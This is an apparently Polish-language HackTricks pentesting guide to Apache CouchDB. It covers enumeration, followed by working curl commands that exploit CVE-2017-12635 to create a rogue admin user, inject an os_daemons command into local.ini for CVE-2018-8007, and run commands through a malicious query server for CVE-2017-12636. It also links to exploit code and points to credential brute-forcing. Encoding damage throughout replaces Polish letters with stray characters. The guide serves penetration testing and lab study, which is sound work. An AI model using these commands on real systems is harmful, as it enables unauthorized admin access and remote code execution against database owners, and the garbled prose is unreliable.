# 5984,6984 - Pentesting CouchDB

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawowe informacje**

**CouchDB** to wszechstronna i pot偶na **baza danych zorientowana na dokumenty**, kt贸ra organizuje dane za pomoc struktury **mapy klucz-warto** w ka偶dym **dokumencie**. Pola w dokumencie mog by reprezentowane jako **pary klucz/warto, listy lub mapy**, co zapewnia elastyczno w przechowywaniu i pobieraniu danych.

Ka偶demu **dokumentowi** przechowywanemu w CouchDB przypisywany jest **unikalny identyfikator** (`_id`) na poziomie dokumentu. Dodatkowo, ka偶da modyfikacja dokonana i zapisana w bazie danych otrzymuje **numer rewizji** (`_rev`). Ten numer rewizji umo偶liwia efektywne **ledzenie i zarzdzanie zmianami**, uatwiajc atwe pobieranie i synchronizacj danych w bazie danych.

**Domylny port:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **Automatyczna enumeracja**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## Rczna enumeracja

### Baner
```
curl http://IP:5984/
```
To wysya 偶danie GET do zainstalowanej instancji CouchDB. Odpowied藕 powinna wyglda mniej wicej jak jedna z poni偶szych:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Zauwa偶, 偶e jeli uzyskujc dostp do g贸wnego katalogu couchdb otrzymasz `401 Unauthorized` z czym takim jak: `{"error":"unauthorized","reason":"Authentication required."}` **nie bdziesz m贸g uzyska dostpu** do banera ani 偶adnego innego punktu kocowego.
{% endhint %}

### Info Enumeration

To s punkty kocowe, do kt贸rych mo偶esz uzyska dostp za pomoc 偶dania **GET** i wyodrbni interesujce informacje. Mo偶esz znale藕 [**wicej punkt贸w kocowych i bardziej szczeg贸owe opisy w dokumentacji couchdb**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Lista uruchomionych zada, w tym typ zadania, nazwa, status i identyfikator procesu.
* **`/_all_dbs`** Zwraca list wszystkich baz danych w instancji CouchDB.
* **`/_cluster_setup`** Zwraca status wza lub klastra, zgodnie z kreatorem konfiguracji klastra.
* **`/_db_updates`** Zwraca list wszystkich zdarze bazy danych w instancji CouchDB. Istnienie bazy danych `_global_changes` jest wymagane do korzystania z tego punktu kocowego.
* **`/_membership`** Wywietla wzy, kt贸re s czci klastra jako `cluster_nodes`. Pole `all_nodes` wywietla wszystkie wzy, o kt贸rych ten wze wie, w tym te, kt贸re s czci klastra.
* **`/_scheduler/jobs`** Lista zada replikacji. Opis ka偶dego zadania bdzie zawiera informacje o 藕r贸dle i celu, identyfikator replikacji, histori ostatnich zdarze i kilka innych rzeczy.
* **`/_scheduler/docs`** Lista stan贸w dokument贸w replikacji. Zawiera informacje o wszystkich dokumentach, nawet w stanach `completed` i `failed`. Dla ka偶dego dokumentu zwraca identyfikator dokumentu, baz danych, identyfikator replikacji, 藕r贸do i cel oraz inne informacje.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** Punkt kocowy `/_node/{node-name}` mo偶e by u偶yty do potwierdzenia nazwy wza Erlang serwera, kt贸ry przetwarza 偶danie. Jest to najbardziej przydatne podczas uzyskiwania dostpu do `/_node/_local`, aby uzyska te informacje.
* **`/_node/{node-name}/_stats`** Zas贸b `_stats` zwraca obiekt JSON zawierajcy statystyki dla dziaajcego serwera. Literalny cig `_local` su偶y jako alias dla lokalnej nazwy wza, wic dla wszystkich adres贸w URL statystyk, `{node-name}` mo偶e by zastpione `_local`, aby interagowa ze statystykami lokalnego wza.
* **`/_node/{node-name}/_system`** Zas贸b \_system zwraca obiekt JSON zawierajcy r贸偶ne statystyki na poziomie systemu dla dziaajcego serwera\_.\_ Mo偶esz u偶y \_\_`_local` jako {node-name}, aby uzyska informacje o bie偶cym w藕le.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Potwierdza, 偶e serwer jest uruchomiony, dziaa i jest gotowy do odpowiadania na 偶dania. Jeli [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) jest `true` lub `nolb`, punkt kocowy zwr贸ci odpowied藕 404.
* **`/_uuids`** 呕da jednego lub wicej Uniwersalnych Unikalnych Identyfikator贸w (UUID) z instancji CouchDB.
* **`/_reshard`** Zwraca liczb zakoczonych, nieudanych, uruchomionych, zatrzymanych i cakowitych zada wraz z stanem reshardingu w klastrze.

Wicej interesujcych informacji mo偶na wyodrbni, jak wyjaniono tutaj: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Database List**
```
curl -X GET http://IP:5984/_all_dbs
```
Jeli ta proba **zwraca 401 nieautoryzowany**, potrzebujesz **wa偶nych powiadcze**, aby uzyska dostp do bazy danych:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
Aby znale藕 wa偶ne dane logowania, mo偶esz **spr贸bowa** [**przeprowadzi atak brute force na usug**](../generic-methodologies-and-resources/brute-force.md#couchdb).

To jest **przykad** odpowiedzi couchdb, gdy masz **wystarczajce uprawnienia** do wywietlenia baz danych (to tylko lista baz danych):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Database Info

Mo偶esz uzyska informacje o bazie danych (takie jak liczba plik贸w i rozmiary) uzyskujc dostp do nazwy bazy danych:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Lista dokument贸w**

Wymie ka偶dy wpis w bazie danych
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Przeczytaj dokument**

Przeczytaj zawarto dokumentu w bazie danych:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB Privilege Escalation [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Dziki r贸偶nicom midzy parserami JSON w Erlangu i JavaScript mo偶esz **utworzy u偶ytkownika administratora** z danymi uwierzytelniajcymi `hacktricks:hacktricks` za pomoc nastpujcego 偶dania:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Wicej informacji na temat tej luki tutaj**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Przegld bezpieczestwa ciasteczek Erlang**

Przykad [std](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

W dokumentacji CouchDB, szczeg贸lnie w sekcji dotyczcej konfiguracji klastra ([link](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), omawiane jest u偶ycie port贸w przez CouchDB w trybie klastra. Wspomniano, 偶e, podobnie jak w trybie samodzielnym, port `5984` jest u偶ywany. Dodatkowo, port `5986` jest przeznaczony dla lokalnych API wz贸w, a co wa偶ne, Erlang wymaga portu TCP `4369` dla Daemon Port Mapper Erlang (EPMD), uatwiajcego komunikacj midzy wzami w klastrze Erlang. Ta konfiguracja tworzy sie, w kt贸rej ka偶dy wze jest poczony z ka偶dym innym wzem.

Podkrelono istotne ostrze偶enie dotyczce portu `4369`. Jeli ten port jest udostpniony w Internecie lub w jakiejkolwiek niezaufanej sieci, bezpieczestwo systemu w du偶ej mierze opiera si na unikalnym identyfikatorze znanym jako "ciasteczko." To ciasteczko dziaa jako zabezpieczenie. Na przykad, w danej licie proces贸w, ciasteczko o nazwie "monster" mo偶e by obserwowane, co wskazuje na jego rol operacyjn w ramach systemu zabezpiecze.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
Dla tych, kt贸rzy s zainteresowani zrozumieniem, jak ten "ciasteczko" mo偶e by wykorzystane do zdalnego wykonania kodu (RCE) w kontekcie system贸w Erlang, dostpna jest dedykowana sekcja do dalszego czytania. Opisuje ona metodologie wykorzystywania ciasteczek Erlang w nieautoryzowany spos贸b w celu uzyskania kontroli nad systemami. Mo偶esz **[zbada szczeg贸owy przewodnik na temat nadu偶ywania ciasteczek Erlang dla RCE tutaj](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **Wykorzystanie CVE-2018-8007 poprzez modyfikacj local.ini**

Przykad [std](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Ostatnio ujawniona luka, CVE-2018-8007, wpywajca na Apache CouchDB, zostaa zbadana, ujawniajc, 偶e wykorzystanie jej wymaga uprawnie do zapisu w pliku `local.ini`. Chocia偶 nie jest to bezporednio stosowane do pocztkowego systemu docelowego z powodu ogranicze bezpieczestwa, wprowadzono modyfikacje, aby przyzna dostp do zapisu w pliku `local.ini` w celach eksploracyjnych. Poni偶ej przedstawiono szczeg贸owe kroki i przykady kodu, ilustrujce ten proces.

Najpierw rodowisko jest przygotowywane poprzez upewnienie si, 偶e plik `local.ini` jest zapisywalny, co jest weryfikowane poprzez wylistowanie uprawnie:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Aby wykorzysta luk, wykonywana jest komenda curl, celujc w konfiguracj `cors/origins` w `local.ini`. To wstrzykuje nowy origin wraz z dodatkowymi komendami w sekcji `[os_daemons]`, majc na celu wykonanie dowolnego kodu:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
Nastpna weryfikacja pokazuje wstrzyknit konfiguracj w `local.ini`, por贸wnujc j z kopi zapasow, aby uwydatni zmiany:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
Pocztkowo oczekiwany plik (`/tmp/0xdf`) nie istnieje, co wskazuje, 偶e wstrzyknite polecenie nie zostao jeszcze wykonane. Dalsze badania ujawniaj, 偶e dziaaj procesy zwizane z CouchDB, w tym jeden, kt贸ry potencjalnie m贸gby wykona wstrzyknite polecenie:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
Poprzez zakoczenie zidentyfikowanego procesu CouchDB i pozwolenie systemowi na automatyczne jego ponowne uruchomienie, wywoywana jest egzekucja wstrzyknitej komendy, co potwierdza istnienie wczeniej brakujcego pliku:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
To badanie potwierdza wykonalno eksploatacji CVE-2018-8007 w okrelonych warunkach, szczeg贸lnie wym贸g dostpu do zapisu do pliku `local.ini`. Podane przykady kodu i kroki proceduralne oferuj jasny przewodnik do powt贸rzenia eksploatu w kontrolowanym rodowisku.

Aby uzyska wicej informacji na temat CVE-2018-8007, zapoznaj si z komunikatem mdsec: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **Badanie CVE-2017-12636 z uprawnieniami do zapisu na local.ini**

Przykad [std](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Zbadano luk znan jako CVE-2017-12636, kt贸ra umo偶liwia wykonanie kodu za porednictwem procesu CouchDB, chocia偶 konkretne konfiguracje mog uniemo偶liwi jej eksploatacj. Pomimo licznych odniesie do Proof of Concept (POC) dostpnych w Internecie, konieczne s dostosowania, aby wykorzysta luk w wersji CouchDB 2, r贸偶nicej si od powszechnie atakowanej wersji 1.x. Pocztkowe kroki obejmuj weryfikacj wersji CouchDB i potwierdzenie braku oczekiwanego cie偶ki serwer贸w zapyta:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
Aby dostosowa si do wersji CouchDB 2.0, wykorzystuje si now cie偶k:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
Pr贸by dodania i wywoania nowego serwera zapyta spotkay si z bdami zwizanymi z uprawnieniami, co zostao wskazane przez nastpujcy wynik:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Dalsze ledztwo ujawnio problemy z uprawnieniami do pliku `local.ini`, kt贸ry nie by zapisywalny. Poprzez modyfikacj uprawnie pliku z dostpem root lub homer, stao si mo偶liwe kontynuowanie:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
Subsequent attempts to add the query server succeeded, as demonstrated by the lack of error messages in the response. The successful modification of the `local.ini` file was confirmed through file comparison:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Proces kontynuowany by od utworzenia bazy danych i dokumentu, a nastpnie pr贸by wykonania kodu za pomoc niestandardowego widoku mapujcego do nowo dodanego serwera zapyta:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
A **[podsumowanie](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** z alternatywnym adunkiem dostarcza dalszych informacji na temat wykorzystania CVE-2017-12636 w okrelonych warunkach. **Przydatne zasoby** do wykorzystania tej podatnoci obejmuj:

- [Kod exploita POC](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Wpis w bazie danych exploit贸w](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## Odniesienia

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
